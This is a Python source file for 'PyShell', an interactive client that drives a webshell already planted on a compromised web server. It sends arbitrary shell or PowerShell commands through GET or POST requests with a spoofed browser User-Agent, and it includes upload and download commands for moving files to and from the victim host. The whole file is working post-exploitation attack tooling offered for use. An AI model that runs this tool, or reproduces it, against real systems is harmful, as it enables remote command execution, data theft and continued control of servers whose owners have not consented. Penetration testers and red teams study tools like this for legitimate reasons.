#!/usr/bin/python3
import sys
import requests
import readline
import argparse
from termcolor import colored

def send_command(command, webshell, method, param="code"):
   headers = {"User-Agent":"Mozilla/6.4 (Windows NT 11.1) Gecko/2010102 Firefox/99.0"}
   params = {param.strip():command.strip()}
   if (method.upper() == "GET"):
      response = requests.get((webshell), params=params, headers=headers)
   elif (method.upper() == "POST"):
      response = requests.post((webshell), data=params, headers=headers)
   return response.content.decode(errors='ignore')

if __name__ == "__main__":
 banner = """
  ██▓███ ▓██   ██▓  ██████  ██░ ██ ▓█████  ██▓     ██▓    
 ▓██░  ██▒▒██  ██▒▒██    ▒ ▓██░ ██▒▓█   ▀ ▓██▒    ▓██▒    
 ▓██░ ██▓▒ ▒██ ██░░ ▓██▄   ▒██▀▀██░▒███   ▒██░    ▒██░    
 ▒██▄█▓▒ ▒ ░ ▐██▓░  ▒   ██▒░▓█ ░██ ▒▓█  ▄ ▒██░    ▒██░    
 ▒██▒ ░  ░ ░ ██▒▓░▒██████▒▒░▓█▒░██▓░▒████▒░██████▒░██████▒
 ▒█▒░ ░  ░  ██▒▒▒ ▒ ▒▓▒ ▒ ░ ▒ ░░▒░▒░░ ▒░ ░░ ▒░▓  ░░ ▒░▓  ░
 ░▒ ░     ▓██ ░▒░ ░ ░▒    ░ ▒ ░▒░ ░ ░ ░  ░░ ░ ▒  ░░ ░ ▒  ░
 ░░   ░   ▒ ▒ ░░  ░  ░  ░   ░  ░░ ░         ░ ░     ░ ░   
 ░        ░             ░      ░      ░       ░          ░ 

 --------------- by @JoelGMSec & @3v4Si0N ---------------

 """

print (colored(banner, 'green'))
parser = argparse.ArgumentParser()
parser.add_argument('url', help='Webshell URL', type=str)
parser.add_argument('method', help='HTTP Method to execute command (GET or POST)', type=str)
parser.add_argument('--ps', default=False, action="store_true", help='PowerShell command execution (Only on Windows hosts)')
parser.add_argument('-p', '--param', default="code", help='Parameter to use with custom WebShell', type=str)
args = parser.parse_args()

try:
    WEBSHELL = args.url
    HTTP_METHOD = args.method
    PARAM = args.param
    whoami = send_command('whoami', WEBSHELL, HTTP_METHOD, PARAM)
    hostname = send_command('hostname', WEBSHELL, HTTP_METHOD, PARAM)

    while True:
       try:
          print (colored("[PyShell] ", "green"), end = '')
          command = input(colored(str(whoami).rstrip()+"@"+str(hostname).rstrip()+" $> ", "blue"))
          if command == "exit":
             print (colored("Exiting..\n", "red"))
             break
          else:
             if "upload" in command.split()[0]: 
                localfile = command.split()[1]
                remotefile = command.split()[2]
                print (colored("Uploading file "+ localfile +" on "+ remotefile +"..\n", "yellow"))
                f = open(localfile, "r")
                rawfiledata = f.read()
                upload = send_command("echo " + rawfiledata.rstrip() + (' > ') + remotefile, WEBSHELL, HTTP_METHOD, PARAM)
             else:
                if "download" in command.split()[0]: 
                   remotefile = command.split()[1]
                   localfile = command.split()[2]
                   print (colored("Downloading file "+ remotefile +" on "+ localfile +"..\n", "yellow"))
                   download = send_command("cat " + remotefile, WEBSHELL, HTTP_METHOD, PARAM)
                   f = open(localfile, "w")
                   f.write(download)
                   f.close
                else:
                   if args.ps:
                      result = send_command("powershell " + command, WEBSHELL, HTTP_METHOD, PARAM)
                      print (colored(result, "yellow"))
                   else:
                      result = send_command(command, WEBSHELL, HTTP_METHOD, PARAM)
                      print (colored(result, "yellow"))

       except KeyboardInterrupt:
          print (colored("\nExiting..\n", "red"))
          break

except Exception as e:
   print(e)
